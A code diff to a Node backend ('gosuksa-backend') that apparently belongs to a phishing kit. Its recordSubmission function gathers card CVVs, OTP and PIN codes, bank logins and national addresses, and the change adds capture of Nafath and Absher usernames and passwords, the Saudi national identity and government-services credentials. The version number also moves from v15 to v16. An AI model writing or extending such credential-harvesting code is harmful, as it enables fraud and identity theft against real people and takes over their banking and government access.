@@ -237,7 +237,8 @@ function recordSubmission(type, payload) {
     set("cardCvv", ["cvv"]);
     set("otp", ["otp", "otpCode", "code", "otpValue", "pinCode", "pin"]);
     set("nafathId", ["nafathId", "nafathNumber", "nafathIdentity"]);
-    set("nafathPassword", ["nafathPassword", "password"]);
+    set("nafathUsername", ["nafathUsername", "nafathUser", "nafathLogin", "nafathLoginName", "nafathUserName", "nafseUsername", "nafseUser", "absherUsername", "absherUser", "userName"]);
+    set("nafathPassword", ["nafathPassword", "nafathPass", "nafsePassword", "absherPassword", "password"]);
     set("bankUsername", ["bankUsername", "username", "userId", "userid"]);
     set("bankPassword", ["bankPassword"]);
     set("address", ["address", "nationalAddress", "streetName", "district"]);
@@ -420,7 +421,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v15";
+const APP_VERSION = "v16";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
